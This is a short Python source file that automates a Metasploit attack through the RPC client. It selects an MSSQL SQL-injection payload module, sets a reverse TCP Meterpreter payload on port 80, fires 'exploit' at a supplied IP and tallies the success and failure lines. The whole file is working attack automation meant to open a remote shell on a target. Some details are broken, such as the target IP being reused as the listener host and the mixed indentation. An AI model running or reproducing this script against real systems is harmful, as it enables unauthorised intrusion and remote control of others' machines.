from ...logging import *
from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
global global_console_status
global global_positive_out
global_positive_out = list()
global_negative_out = list()
global_console_status = False

def read_console(console_data):
    global global_console_status
    global_console_status = console_data['busy']
    print global_console_status
    if '[+]' in console_data['data']:
	sigdata = console_data['data'].rstrip().split('\n')
	for line in sigdata:
	    if '[+]' in line:
		    global_positive_out.append(line)
        if '[-]' in line:
            global_negative_out.append(line)
    MetasploitLog(console_data['data'])
    print console_data['data']

def run(IP):
    client = MsfRpcClient('password')
    console = MsfRpcConsole(client, cb=read_console)
    console.execute("use windows/mssql/mssql_payload_sqli")
    MetasploitLog("creating payload")
    console.execute("set GET_PATH " + IP)
    console.execute("set RHOST " + IP)
    console.execute("set PAYLOAD windows/patchupmeterpreter/reverse_tcp")
    console.execute("set LHOST " + IP)
    console.execute("set LPORT 80")
    console.execute("exploit")
    MetasploitLog("Positives: " + str(len(global_positive_out)))
    MetasploitLog("Netagives: " + str(len(global_negative_out)))
    return